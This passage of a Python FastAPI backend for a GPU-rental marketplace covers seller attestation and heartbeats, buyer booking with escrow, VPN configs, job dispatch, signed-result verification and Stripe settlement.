    inspect — confidentiality, not just integrity. The report carries a
    server-issued nonce, an allowlisted enclave measurement, and a vendor
    signature (NVIDIA NRAS / AMD SEV-SNP / Intel TDX in production)."""
    owner = _require_seller(db, user)
    spec = get_spec_by_id(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    nonce = data.report.get("nonce", "")
    if not consume_challenge(db, spec.id, nonce):
        raise HTTPException(status_code=400, detail="Invalid or expired challenge nonce")
    try:
        measurement = verify_tee_report(data.report, data.signature, nonce)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=f"TEE attestation failed: {e}")
    vendor = data.report.get("vendor", "unknown")
    set_spec_confidential(db, spec, vendor, measurement,
                          __import__("json").dumps({"report": data.report,
                                                    "signature": data.signature}))
    return {"status": "ok", "confidential": True, "vendor": vendor,
            "measurement": measurement, "spec_id": spec.id}


@app.post("/heartbeat", tags=["seller"])
def heartbeat(data: HeartbeatModel, request: Request, owner=Depends(api_key_user),
              db: Session = Depends(get_db)):
    """Seller node agent pings here (~every 15s). We also GeoIP-verify the node's
    region from its source IP: declared country must match the detected country
    for the spec to count as residency-verified."""
    require_scope(owner, "node")
    spec = get_spec_by_id(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    was_offline = spec.status != "online"       # for reconnect detection
    first_time = spec.last_seen is None
    detected = geolocate_country(_client_ip(request))
    spec.detected_country = detected
    spec.region_verified = bool(detected and spec.country and detected == spec.country)
    touch_spec(db, spec)   # persists detected/verified + online/last_seen
    note_heartbeat(db, spec)
    # Seller activity is observed HERE (the agent's authenticated OUTBOUND call) — no
    # inbound port, no direct scrape of the seller machine. Ids live in the log body.
    try:
        obsmod.inc_metric("petabyte_seller_heartbeats_total", environment=obsmod.ENVIRONMENT)
        with obs.ctx(seller_id=str(owner.id), gpu_id=spec.public_id):
            if first_time:
                obs.event(EVENTS.GPU_DETECTED, message="gpu detected on heartbeat",
                          gpu_model=spec.gpu_model, gpu_count=spec.gpu_count,
                          country=spec.country, detected_country=detected,
                          region_verified=spec.region_verified)
            if was_offline and not first_time:
                obsmod.inc_metric("petabyte_seller_reconnects_total", environment=obsmod.ENVIRONMENT)
                obs.event(EVENTS.SELLER_RECONNECTED, message="seller agent reconnected",
                          gpu_model=spec.gpu_model)
            else:
                obs.event(EVENTS.SELLER_HEARTBEAT, message="heartbeat", state="online")
            # region spoofing is suspicious telemetry worth surfacing
            if detected and spec.country and detected != spec.country:
                obsmod.inc_metric("petabyte_seller_suspicious_total",
                                  category="region_mismatch", environment=obsmod.ENVIRONMENT)
                obs.event(EVENTS.SELLER_SUSPICIOUS, level=logging.WARNING,
                          message="declared country != detected", category="region_mismatch",
                          declared=spec.country, detected=detected)
    except Exception:  # noqa: BLE001
        pass
    # Compact earnings forecast so the agent can show the seller what they're making, live.
    try:
        from earnings import forecast as _forecast
        _e = _forecast(spec.price_per_hour, PLATFORM_TAKE_RATE,
                       idle_daily_usd=spec.idle_est_daily_usd, idle_enabled=spec.idle_fallback)
        _earn = {"net_per_hour": _e["net_per_hour"],
                 "estimated_daily_usd_low": _e["headline"]["low_daily_usd"],
                 "estimated_daily_usd_high": _e["headline"]["high_daily_usd"],
                 "idle_mining_daily_usd": _e["idle_mining_daily_usd"]}
    except Exception:  # noqa: BLE001
        _earn = None
    return {"status": "ok", "spec_id": spec.id, "state": "online",
            "detected_country": detected, "region_verified": spec.region_verified,
            "idle_fallback": bool(spec.idle_fallback),
            "disk": _disk_cfg(spec),      # start/limit/stop the spare-disk storage node
            "earnings": _earn}


@app.get("/nodes/{spec_id}/earnings_forecast", tags=["seller"])
def node_earnings_forecast(spec_id: int, user: dict = Depends(get_current_user),
                           db: Session = Depends(get_db)):
    """The seller's honest earnings forecast for one of their nodes: definitive net take-home
    per hour + estimated daily/monthly at several utilization levels (+ idle-mining trickle)."""
    me = get_user_by_username(db, _username(user))
    spec = get_spec_by_id(db, spec_id)
    if not spec or me is None or spec.user_id != me.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    from earnings import forecast
    out = forecast(spec.price_per_hour, PLATFORM_TAKE_RATE,
                   idle_daily_usd=spec.idle_est_daily_usd, idle_enabled=spec.idle_fallback)
    out["spec_id"] = spec.id
    out["gpu_model"] = spec.gpu_model
    return out


@app.get("/nodes/{spec_id}/price/recommendation", tags=["seller"])
def node_price_recommendation(spec_id: int, user: dict = Depends(get_current_user),
                              db: Session = Depends(get_db)):
    """An explainable, performance-anchored price recommendation for one of the seller's nodes.

    Anchors on the per-GPU cloud on-demand rate ("cheaper than cloud, verified"), then adjusts for
    live demand, verified trust, confidential/region/reputation premiums — and returns every step
    as a labelled factor so the seller sees WHY. Advisory only: the seller still sets the price
    (this is also exactly what auto-price applies when the node opts in)."""
    me = get_user_by_username(db, _username(user))
    spec = get_spec_by_id(db, spec_id)
    if not spec or me is None or spec.user_id != me.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    import pricing_engine
    # Live demand for THIS GPU class: busy / total across live, attested specs of the same model.
    key = (spec.gpu_model or "cpu").lower()
    busy = total = 0
    for s in db.query(SellerSpec).filter(SellerSpec.attested == True).all():  # noqa: E712
        if (s.gpu_model or "cpu").lower() != key or not spec_is_live(s):
            continue
        t = s.total_units or 1
        total += t
        busy += max(0, t - (s.available_units or 0))
    util = (busy / total) if total else 0.0
    tl = trust_level_for(spec)
    rec = pricing_engine.recommend(
        cloud_reference_for(spec.gpu_model),
        perf_reference=pricing_engine.performance_reference_price(spec.gpu_model),
        utilization=util,
        trust_level=tl.get("level"),
        benchmark_verdict=getattr(spec, "benchmark_verdict", None),
        confidential=dbmod.spec_confidential_active(spec),
        region_verified=bool(getattr(spec, "region_verified", False)),
        reputation=me.reputation,
        min_price=(float(spec.min_price) if spec.min_price is not None else None),
        max_price=(float(spec.max_price) if spec.max_price is not None else None),
        current_price=float(spec.price_per_hour or 0),
    )
    rec["spec_id"] = spec.id
    rec["gpu_model"] = spec.gpu_model
    rec["utilization_pct"] = round(util * 100, 1)
    rec["trust_level"] = tl.get("level")
    rec["trust_label"] = tl.get("label")
    rec["auto_price"] = bool(spec.auto_price)
    return rec


# ------------------- BUYER -------------------

@app.post("/request_vm")
def request_vm(req: RequestVMModel, user: dict = Depends(get_current_user),
               db: Session = Depends(get_db),
               idempotency_key: Optional[str] = Header(None, alias="Idempotency-Key")):
    username = _username(user)
    endpoint = "request_vm"

    # Replay / claim the idempotency slot BEFORE any side effects.
    if idempotency_key:
        claim = idem_begin(db, idempotency_key, username, endpoint)
        if claim != "new":
            if claim.status_code:  # finished earlier -> replay stored response
                return JSONResponse(status_code=claim.status_code,
                                    content=__import__("json").loads(claim.response))
            raise HTTPException(status_code=409, detail="Duplicate request in progress")

    def _fail(status, detail):
        if idempotency_key:
            idem_abort(db, idempotency_key, username, endpoint)
        raise HTTPException(status_code=status, detail=detail)

    buyer = get_user_by_username(db, username)
    if not buyer:
        _fail(401, "Unknown user")
    spec = get_spec_by_id(db, req.spec_id)
    if not spec:
        _fail(404, {"code": "GPU_NOT_FOUND",
                    "message": "That GPU isn't listed any more — the host may have taken it "
                               "offline. Browse what's available now.",
                    "next": "/marketplace"})
    if not spec.attested:
        _fail(409, {"code": "GPU_NOT_VERIFIED",
                    "message": "This host hasn't finished proving its hardware, so it can't "
                               "take paid work yet. Pick a verified host.",
                    "next": "/marketplace"})
    if not spec_is_live(spec):
        _fail(503, {"code": "HOST_OFFLINE",
                    "message": "That host just went offline — it stopped sending heartbeats. "
                               "Nothing was charged. Try another verified host.",
                    "next": "/marketplace"})
    if spec.user_id == buyer.id:
        _fail(400, {"code": "OWN_HARDWARE",
                    "message": "This is your own machine. You can't rent from yourself — "
                               "earnings come from other people's jobs."})
    if req.require_confidential and not spec_confidential_active(spec):
        _fail(403, "Spec is not confidential-computing attested (or its attestation is stale)")
    if req.require_region and ((spec.region or "") != req.require_region or not spec.region_verified):
        _fail(403, f"Spec not in a VERIFIED region {req.require_region}")
    if req.require_country and ((spec.detected_country or "") != req.require_country or not spec.region_verified):
        _fail(403, f"Spec not in a VERIFIED country {req.require_country}")
    owner = get_user_by_id(db, spec.user_id)
    if not owner or not owner.can_accept_paid_jobs or owner.reputation < MIN_REPUTATION:
        _fail(403, "Seller not trusted for paid work (reputation too low)")
    if req.hours > spec.duration:
        _fail(400, "Requested hours exceed the offer")

    gross = round(spec.price_per_hour * req.hours, 4)

    # Charge an org wallet (shared budget) or the personal wallet.
    pay_org_id = None
    if req.org_id is not None:
        if not get_membership(db, req.org_id, buyer.id):
            _fail(403, "Not a member of that organization")
        pay_org_id = req.org_id

    # Atomic capacity reservation — prevents double-sell under concurrency.
    if not try_reserve_unit(db, req.spec_id):
        _fail(409, {"code": "NO_CAPACITY",
                    "message": "Every unit on this host was taken while you were deciding. "
                               "Nothing was charged. Another host may have the same GPU.",
                    "next": "/marketplace"})

    # Kill switch, checked BEFORE we reserve capacity or move a cent. The guard inside
    # book_with_escrow stays as defence-in-depth, but the clean path is to refuse early
    # rather than debit-then-refund.
    _paused, _reason = bookings_are_paused(db)
    if _paused:
        release_unit(db, req.spec_id)
        if idempotency_key:
            idem_abort(db, idempotency_key, username, endpoint)
        raise BookingsPaused(_reason)

    # Atomic debit (org budget-capped, or personal); return the unit if it fails.
    debited = try_org_debit(db, pay_org_id, gross) if pay_org_id else try_debit(db, buyer.id, gross)
    if not debited:
        release_unit(db, req.spec_id)
        _fail(402, {"code": "INSUFFICIENT_FUNDS",
                    "message": "Not enough in your wallet for this rental. You prepay the "
                               "full window into escrow and get the unused hours back when "
                               "you stop.",
                    "next": "/account"})

    try:
        booking = book_with_escrow(db, buyer, spec, req.hours, req.vpn, PLATFORM_TAKE_RATE, org_id=pay_org_id)
    except Exception as _e:
        # Compensate FIRST — give the unit back and return the money — then report.
        release_unit(db, req.spec_id)
        if pay_org_id:
            org_refund(db, pay_org_id, gross)
        else:
            deposit(db, buyer, gross)
        if idempotency_key:
            idem_abort(db, idempotency_key, username, endpoint)
        if isinstance(_e, BookingsPaused):
            raise            # the kill switch is not a 500; say so honestly
        logger.exception("booking failed for %s spec=%s", username, req.spec_id)
        raise HTTPException(status_code=500, detail="Booking failed")

    resp = {
        "status": "ok",
        "booking_id": booking.id,
        "gross_amount": booking.gross_amount,
        "platform_fee": booking.platform_fee,
        "seller_payout": booking.seller_payout,
        "booking_status": booking.status,
        "vpn_config_url": f"/vpn_config/{booking.id}" if req.vpn else None,
    }
    if idempotency_key:
        idem_finish(db, idempotency_key, username, endpoint, 200, resp)
    return resp


@app.get("/vpn_config/{booking_id}", response_class=PlainTextResponse)
def get_wg_config(booking_id: int, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    buyer = get_user_by_username(db, _username(user))
    booking = get_booking_by_id(db, booking_id)
    if not booking or not buyer or booking.buyer_id != buyer.id:
        raise HTTPException(status_code=404, detail="Booking not found")
    if not booking.vpn:
        raise HTTPException(status_code=400, detail="Booking has no VPN")
    client_priv, client_pub = gen_wg_keypair()
    peer = add_wg_peer(db, buyer, client_pub)        # race-safe allocation
    apply_peer_to_interface(client_pub, peer.address)
    return build_client_wg_config(client_priv, peer.address)



# ------------------- TASKS / JOB DISPATCH -------------------

@app.post("/create_task")
def create_task_endpoint(data: TaskCreateModel, user: dict = Depends(get_current_user),
                         db: Session = Depends(get_db)):
    """Buyer queues work against a booking they own (which is already paid/escrowed)."""
    if data.task_type not in ("notebook", "vm", "template", "render", "transcode", "stitch"):
        raise HTTPException(status_code=400, detail="task_type must be notebook|vm|template|render|transcode|stitch")
    if data.task_type == "template" and data.template not in TEMPLATES:
        raise HTTPException(status_code=400, detail=f"unknown template; choose from {list(TEMPLATES)}")
    buyer = get_user_by_username(db, _username(user))
    if not buyer:
        raise HTTPException(status_code=401, detail="Unknown user")
    booking = get_booking_for_buyer(db, data.booking_id, buyer)
    if not booking:
        raise HTTPException(status_code=404, detail="Booking not found or not yours")
    if data.task_type == "notebook" and not data.code:
        raise HTTPException(status_code=400, detail="notebook task requires code")
    task = create_task(db, booking, data.task_type, code=data.code, vm_type=data.vm_type,
                       cpu=data.cpu, ram=data.ram, cuda=data.cuda)
    if data.task_type == "template":
        task.template = data.template
        task.template_params = json.dumps(data.template_params or {})
    task.priority = data.priority
    task.backup_enabled = data.backup_enabled
    task.backup_interval_s = data.backup_interval_s
    task.volume = data.volume or (f"{data.template}-data" if data.template else "task-data")
    db.add(task); db.commit()
    mark_booking_active(db, booking.id)
    return {"status": "ok", "task_id": task.id, "task_status": task.status}


@app.get("/jobs/next")
def jobs_next(agent=Depends(api_key_user), db: Session = Depends(get_db)):
    """Agent pulls the next job for hardware IT OWNS. Atomic claim; returns 204 if none.

    Authorization is ownership: an agent can only ever receive work for specs whose
    user_id matches the API key's user. This replaces the old 'any agent runs any
    task' behavior.
    """
    task = claim_next_task(db, agent)
    if not task:
        return Response(status_code=204)   # 204 must carry no body
    mark_task_running(db, task)
    # PRODUCER span across the queue/network boundary: inject the current W3C trace context
    # into the job envelope so the seller agent's execution joins THIS trace end-to-end.
    with obs.span("job.dispatch", kind="producer", task_type=str(task.task_type)):
        payload = _build_job_payload(task, db)
        payload["trace_context"] = obs.inject({})
        from db import ComputeTransaction as _ComputeTx
        _txp = db.query(_ComputeTx).filter(_ComputeTx.task_id == task.id).first()
        tx_pub = getattr(_txp, "public_id", None)
        # A successful claim is the seller ACCEPTING the job (pull model).
        obsmod.inc_metric("petabyte_seller_job_decisions_total", decision="accepted",
                          environment=obsmod.ENVIRONMENT)
        with obs.ctx(seller_id=str(getattr(agent, "id", "")) or None):
            obs.event(EVENTS.JOB_DISPATCHED, message="job dispatched",
                      task_type=task.task_type, job_id=task.id, transaction_id=tx_pub)
            obs.event(EVENTS.JOB_ACCEPTED, message="seller accepted job",
                      task_type=task.task_type, job_id=task.id)
    return payload


def _record_benchmark_sample(db, spec, *, source, metrics=None, verdict=None,
                             pow_verified=None, elapsed_s=None, tokens_sec=None):
    """Append a labelled example to the authenticity training dataset. Never raises."""
    try:
        from db import record_benchmark_sample
        record_benchmark_sample(db, spec, source=source, metrics=metrics, verdict=verdict,
                                pow_verified=pow_verified, elapsed_s=elapsed_s, tokens_sec=tokens_sec)
    except Exception:
        logger.debug("benchmark sample record failed (non-fatal)", exc_info=True)


def _job_runtime_budget_s(task, db=None):
    """The runtime budget (seconds) the buyer's authorization pays for — the agent kills the
    container at this deadline so a job can't consume more of the seller's GPU than was
    authorized (audit H1). None for jobs with no paid ComputeTransaction (test/benchmark).

    The ORM has no Task->ComputeTransaction relationship, so we look the tx up by task_id from
    the provided session (falling back to a pre-attached task.compute_tx if a caller set one)."""
    tx = getattr(task, "compute_tx", None)
    if tx is None and db is not None:
        try:
            from db import ComputeTransaction
            tx = db.query(ComputeTransaction).filter(
                ComputeTransaction.task_id == task.id).first()
        except Exception:
            tx = None
    if not tx or not getattr(tx, "authorization_amount", 0) or not tx.pricing_snapshot:
        return None
    try:
        import pricing as _pr
        return _pr.authorized_seconds(json.loads(tx.pricing_snapshot), tx.authorization_amount)
    except Exception:
        return None


def _build_job_payload(task, db=None) -> dict:
    """Build the job envelope returned to the agent. Never includes platform secrets or
    full buyer workload inputs beyond what the job type needs to run."""
    _backup = {"backup_enabled": bool(task.backup_enabled),
               "backup_interval_s": task.backup_interval_s,
               "volume": task.volume,
               "restore_from": task.latest_checkpoint_ref}   # restore if a backup exists
    _rt = _job_runtime_budget_s(task, db)
    _rt_kw = {"max_runtime_s": _rt} if _rt else {}    # authorized runtime budget (H1); agent enforces
    if task.task_type == "notebook":
        return {"task_id": task.id, "task_type": "notebook", "code": task.code, **_rt_kw}
    if task.task_type == "test":
        params = json.loads(task.code or "{}")
        return {"task_id": task.id, "task_type": "test",
                "size": params.get("size"), "seed": params.get("seed"), **_backup}
    if task.task_type == "benchmark":
        ch = json.loads(task.code or "{}")
        return {"task_id": task.id, "task_type": "benchmark",
                "bench_seed": ch.get("bench_seed"), "bench_size": ch.get("bench_size"), **_backup}
    if task.task_type == "render":
        rp = json.loads(task.template_params or "{}")
        return {"task_id": task.id, "task_type": "render", "image": RENDER_IMAGE,
                "gpu": True, **rp, **_backup, **_rt_kw}
    if task.task_type == "transcode":
        rp = json.loads(task.template_params or "{}")
        return {"task_id": task.id, "task_type": "transcode", "image": FFMPEG_IMAGE,
                "gpu": bool(rp.get("use_gpu", True)), **rp, **_backup, **_rt_kw}
    if task.task_type == "stitch":
        rp = json.loads(task.template_params or "{}")
        return {"task_id": task.id, "task_type": "stitch", "image": FFMPEG_IMAGE,
                **rp, **_backup, **_rt_kw}
    if task.task_type == "distributed":
        # One rank of a multi-node cluster. The agent runs `image`/`command` under torchrun with
        # the rank/world_size below, forming an NCCL/gloo cluster with the other ranks OVER THE
        # VPN. EVERY rank POSTs its own VPN address to register_url (so the cluster is exportable as
        # an MPI hostfile / Ray address); rank 0's registration also becomes the master. Non-master
        # ranks poll rendezvous_url until the master address appears, then join.
        rp = json.loads(task.template_params or "{}")
        jid = rp.get("job_id")
        return {"task_id": task.id, "task_type": "distributed",
                "image": rp.get("image"), "command": rp.get("command"),
                "gpu": True, "env": rp.get("env") or {},
                # cluster peers must reach each other over the WireGuard mesh (not the public net)
                "egress": "cluster",
                "distributed": {"job_id": jid, "rank": rp.get("rank"),
                                "world_size": rp.get("world_size"),
                                "backend": rp.get("backend", "nccl"),
                                "is_master": bool(rp.get("is_master")),
                                "selftest": bool(rp.get("selftest")),
                                "register_url": "/jobs/rendezvous",
                                "rendezvous_url": f"/jobs/rendezvous/{jid}"},
                **_backup}
    if task.task_type == "template":
        tpl = TEMPLATES.get(task.template, {})
        params = json.loads(task.template_params or "{}")
        # A serving LLM template must have a model to boot. Fall back to the template's
        # documented default so a one-click launch actually starts a usable service instead
        # of a crash-looping container; the buyer can still override via params.model.
        if not params.get("model") and tpl.get("default_model"):
            params["model"] = tpl["default_model"]
        return {"task_id": task.id, "task_type": "template", "template": task.template,
                "image": tpl.get("image"), "port": tpl.get("port"),
                "cache": tpl.get("cache"), "gpu": tpl.get("gpu", True),
                # The agent enforces this. Default CLOSED: if a template forgets to
                # declare a policy, the workload gets no network rather than the host's.
                "egress": tpl.get("egress", "none"),
                "params": params, **_backup}
    return {"task_id": task.id, "task_type": "vm", "vm_type": task.vm_type,
            "cpu": task.cpu, "ram": task.ram, "cuda": task.cuda}


def _observed_seconds(task) -> int:
    """Platform-observed billable wall-clock for a task, measured DISPATCH -> RESULT on the
    server's own clock — never a seller- or browser-supplied duration (audit M1).

    Billing must reflect only the time the node actually held the job, not the queue wait
    before it was assigned: the window is assigned_at -> completed_at. We fall back
    conservatively (assigned_at -> now if the result timestamp is missing; created_at only if
    the task was never assigned) and floor at 1s. record_metering caps this at the snapshot's
    max_duration_s and settle() further clamps the charge to the buyer's authorized budget, so
    this value can only ever be an honest LOWER-or-equal bound on what the buyer is charged."""
    def _aware(dt):
        if dt is None:
            return None
        return dt.replace(tzinfo=timezone.utc) if dt.tzinfo is None else dt
    start = _aware(getattr(task, "assigned_at", None)) or _aware(getattr(task, "created_at", None))
    if start is None:
        return 1
    end = _aware(getattr(task, "completed_at", None)) or datetime.now(timezone.utc)
    return max(1, int((end - start).total_seconds()))


def _auto_settle_compute_tx(db, task):
    """Bridge a completed, signature-verified job to Stripe settlement
    (meter -> capture -> transfer). Returns the resulting compute-tx status, or None
    when the task isn't tied to a paid ComputeTransaction (legacy/unpaid path).

    Guards:
      * opt-out via AUTO_SETTLE_ON_RESULT=false (settlement then stays admin-driven);
      * FAIL CLOSED for templates whose correctness needs manifest validation that is
        not yet carried in the result payload (e.g. pytorch-matmul-v1) — never auto-pay
        a result we cannot validate;
      * everything downstream is idempotent + FSM-guarded, so a duplicate result or a
        concurrent admin action can't double-charge or double-pay.
    """
    if os.getenv("AUTO_SETTLE_ON_RESULT", "true").lower() != "true":
        return None
    from db import ComputeTransaction
    tx = db.query(ComputeTransaction).filter(ComputeTransaction.task_id == task.id).first()
    if not tx:
        return None                      # legacy booking / unpaid diagnostic job
    if (getattr(task, "template", "") or "") == "pytorch-matmul-v1":
        # The matmul manifest isn't part of JobResultModel yet, so we can't run
        # matmul_validation here. Fail closed: leave capture/transfer to the admin
        # path rather than pay on an unvalidated numeric result.
        logger.info("tx %s: %s completed but manifest validation isn't wired; "
                    "leaving settlement to the admin path (fail-closed)",
                    tx.public_id, task.template)
        return tx.status
    try:
        return _sc.settle_after_result(db, tx, metered_seconds=_observed_seconds(task),
                                       source="platform")
    except Exception:
        logger.exception("auto-settle error for tx %s (job completed; retry via admin)",
                         tx.public_id)
        return tx.status


def _auto_fail_compute_tx(db, task, reason: str = "job reported failed"):
    """FAILURE counterpart to _auto_settle_compute_tx: fail-close the Stripe-native tx for a job
    that reported failure so it never lingers in RUNNING (buyer can't cancel, unit pinned). Moves
    the tx to JOB_FAILED and frees the reservation + voids the buyer's hold. No-op for a task with
    no paid tx (legacy/unpaid). Best-effort + idempotent — never turns a result POST into a 500."""
    from db import ComputeTransaction
    tx = db.query(ComputeTransaction).filter(ComputeTransaction.task_id == task.id).first()
    if not tx:
        return None
    try:
        return _sc.fail_job(db, tx, reason=reason).status
    except Exception:
        logger.exception("auto-fail error for tx %s (job failed)", tx.public_id)
        # The session may be in a broken state (e.g. a failed flush left a PendingRollbackError);
        # reading tx.status then triggers a refresh query that raises. Roll back FIRST, and fall
        # back to a literal — a result POST must NEVER become a 500.
        try:
            db.rollback()
            return tx.status
        except Exception:  # noqa: BLE001
            return None


@app.post("/jobs/result")
def jobs_result(data: JobResultModel, agent=Depends(api_key_user),
                db: Session = Depends(get_db)):
    """Agent submits a SIGNED result. Signature is verified against the spec's
    attestation pubkey (binds result -> attested hardware). Test workloads are
    checked against their known answer and update seller reputation."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    spec = _get_spec(db, task.spec_id)
    if not spec or not spec.attest_pubkey:
        raise HTTPException(status_code=409, detail="Spec not attested; cannot verify result")

    # 1) Cryptographic proof-of-work: the result must be signed by the attested key.
    try:
        verify_signed_proof(spec.attest_pubkey, data.proof, data.signature)
    except ValueError as e:
        # A forged/expired signature is unforgeable-by-accident -> hard fraud: penalize,
        # record fraud, AND freeze payouts pending review (money can't leave while we check).
        import seller_audit
        if task.task_type == "test":
            tw = get_testworkload_by_task(db, task.id)
            if tw:
                record_test_result(db, tw, "<invalid-signature>")
        submit_task_result(db, task, None, "failed")
        seller_audit.freeze_for_fraud(db, spec, "invalid result signature",
                                      seller_id=agent.id)
        raise HTTPException(status_code=401, detail=f"Invalid proof: {e}")

    # 2) Known-answer test workloads: compare to the expected hash, update reputation.
    if task.task_type == "test":
        tw = get_testworkload_by_task(db, task.id)
        if not tw:
            raise HTTPException(status_code=404, detail="Test record missing")
        passed = record_test_result(db, tw, data.proof["output_hash"])
        submit_task_result(db, task, None, "completed" if passed else "failed")
        # Failing a PLATFORM audit (server-seeded, unannounced) is strong evidence the
        # seller isn't really computing on the claimed GPU -> freeze payouts for review.
        # (A seller's own manual self-test failing just costs reputation, not a freeze.)
        if not passed and getattr(tw, "trigger", "manual") == "audit":
            import seller_audit
            seller_audit.freeze_for_fraud(db, spec, "failed platform integrity audit",
                                          seller_id=agent.id, penalty=0)
        # Quorum replica: record this seller's result; the cross-seller comparison (not
        # the known answer) decides — divergence from the majority freezes the diverging
        # seller, and a no-majority split holds everyone for review.
        if getattr(tw, "trigger", "manual") == "quorum":
            import quorum
            # Prefer the REAL signed content hash of the output bytes for quorum comparison —
            # two honest nodes doing the same deterministic work produce the same content_hash.
            quorum.record_submission(
                db, task.id, data.proof.get("content_hash") or data.proof.get("output_hash"))
        return {"status": "ok", "task_id": task.id, "test_passed": passed,
                "reputation": agent.reputation,
                "can_accept_paid_jobs": agent.can_accept_paid_jobs}

    # 3) Normal job: the signature binds the output to the node. Persist the seller-signed
    #    content_hash (sha256 of the real output bytes) so a fraction of real jobs can be
    #    re-executed on independent nodes and compared (quorum) — not just trusted.
    submit_task_result(db, task, data.result or data.proof.get("output_hash"), data.status,
                       content_hash=data.proof.get("content_hash"),
                       signature=data.signature, proof=data.proof)
    # Real-job re-verification: if this completion is a SHADOW re-run of a sampled job, record
    # its content hash to the open quorum (a divergent hash vs the honest majority freezes this
    # node). Then, with probability REVERIFY_SAMPLE_RATE, re-verify THIS job on other nodes.
    if data.status == "completed":
        try:
            import quorum as _quorum
            _quorum.record_submission(
                db, task.id, data.proof.get("content_hash") or data.proof.get("output_hash"))
            import reverify as _reverify
            _reverify.sample_and_open(db, task)
        except Exception:
            logger.exception("real-job re-verification hook failed (non-fatal)")
    if data.status == "completed":
        lat = None
        try:
            ca = task.created_at
            if ca is not None and ca.tzinfo is None:
                from datetime import timezone as _tz
                ca = ca.replace(tzinfo=_tz.utc)
            from datetime import datetime as _dt, timezone as _tz2
            lat = (_dt.now(_tz2.utc) - ca).total_seconds() if ca else None
        except Exception:
            lat = None
        note_job_completed(db, spec, lat)
    else:
        note_job_failed(db, spec, "job reported failed")
    released = False
    if data.status == "completed" and task.booking_id:
        released = release_booking(db, task.booking_id)   # pay seller + platform (legacy)
    compute_tx_status = None
    if data.status == "completed":
        _advance_manifest(db, task, data.result or data.proof.get("output_hash"))
        # Orchestrator bridge: a completed, signature-verified job for a Stripe-native
        # ComputeTransaction now finalizes metering + capture + seller transfer, instead
        # of waiting for a manual admin call. Fail-closed + idempotent (see below).
        compute_tx_status = _auto_settle_compute_tx(db, task)
    else:
        # FAILURE bridge: a Stripe-native tx must not stay stuck in RUNNING when its job fails.
        # Move it to JOB_FAILED and free the reservation + void the buyer's hold (bills nothing).
        # Legacy bookings stay retained here (failed tasks are retryable — see /tasks/{id}/retry).
        compute_tx_status = _auto_fail_compute_tx(db, task, reason="job reported failed")
        # If this task is one rank of a distributed cluster, a dead rank fails the whole run.
        _fail_distributed_if_member(db, task)
    # NOTE: a failed job is NOT auto-refunded here — failed tasks are retryable
    # (see /tasks/{id}/retry), which relies on the escrow being retained. Escrow is
    # returned by the buyer cancel path and by the reaper when a node goes dead.
    return {"status": "ok", "task_id": task.id, "task_status": task.status,
            "output_hash": data.proof.get("output_hash"), "booking_released": released,
            "compute_tx_status": compute_tx_status}


@app.post("/dispatch_test")
def dispatch_test(data: DispatchTestModel, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    """Queue a known-answer test for an attested spec the caller owns.

    The answer is computed server-side, so even though the owner triggers it,
    they cannot fake a pass (result is signature-verified and hash-checked)."""
    owner = _require_seller(db, user)
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    if not spec.attested:
        raise HTTPException(status_code=409, detail="Spec must be attested first")
    task, tw = create_test_task(db, spec, data.difficulty, trigger="manual")
    return {"status": "ok", "task_id": task.id, "difficulty": tw.difficulty}


@app.get("/tasks/{task_id}")
def get_task_status(task_id: int, user: dict = Depends(get_current_user),
                    db: Session = Depends(get_db)):
    """Buyer fetches the status/result of a task they own."""
    from db import Task
    buyer = get_user_by_username(db, _username(user))
    task = db.query(Task).filter(Task.id == task_id).first()
    if not task or not buyer or task.buyer_id != buyer.id:
        raise HTTPException(status_code=404, detail="Task not found")
    return {"task_id": task.id, "task_type": task.task_type, "status": task.status,
            "result": task.result, "progress": task.progress,
            "progress_msg": task.progress_msg, "template": task.template,
            "retries": task.retries}


@app.post("/jobs/vm_details")
def jobs_vm_details(data: VMDetailsModel, agent=Depends(api_key_user),
                    db: Session = Depends(get_db)):
    """Agent reports VM connection details for a vm task it owns."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    info = {"vm_type": data.vm_type, "vm_id": data.vm_id, "ip_address": data.ip_address,
            "port": data.port, "connection_string": data.connection_string,
            "status": data.status}
    submit_task_result(db, task, json.dumps(info), data.status)
    return {"status": "ok", "task_id": task.id, "vm_info": info}




# ------------------- MARKETPLACE (browse / stats) -------------------

@app.get("/specs")
def list_specs(user: dict = Depends(get_current_user), db: Session = Depends(get_db),
               confidential: Optional[bool] = None,
               region: Optional[str] = None):
    """Bookable inventory: attested, online, has capacity, seller trusted."""
    from db import SellerSpec
    out = []
    for spec in db.query(SellerSpec).filter(SellerSpec.attested == True).all():  # noqa: E712
        if not spec_is_live(spec) or spec.available_units < 1:
            continue
        owner = get_user_by_id(db, spec.user_id)
        if not owner or not owner.can_accept_paid_jobs:
            continue
        if confidential is not None and bool(spec.confidential) != confidential:
            continue
        if region is not None and (spec.region or "") != region:
            continue
        out.append({
            "spec_id": spec.id, "provider": spec.provider,
            "gpu_model": spec.gpu_model, "gpu_count": spec.gpu_count,
            "vram_gb": spec.vram_gb, "cpu": spec.cpu, "ram": spec.ram,
            "price_per_hour": spec.price_per_hour,
            # Per-GPU-class cloud rate (None when no fair comparison exists) so the
            # UI never divides a 4090 by an H100 price to invent a saving.
            "cloud_reference": cloud_reference_for(spec.gpu_model),
            "available_units": spec.available_units,
            "reputation": owner.reputation,
            "confidential": bool(spec.confidential),
            "tee_vendor": spec.tee_vendor,
            "region": spec.region, "country": spec.country,
            "detected_country": spec.detected_country,
            "region_verified": bool(spec.region_verified),
            "benchmark_tokens_sec": spec.benchmark_tokens_sec,
            "reputation_score": compute_reputation(db, spec)["score"],
            "trust": trust_level_for(spec),
        })
    out.sort(key=lambda x: x["price_per_hour"])
    return {"specs": out}


@app.get("/specs/{spec_id}/attestation")
def spec_attestation(spec_id: int, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """Return a spec's TEE report so the BUYER can verify it client-side against
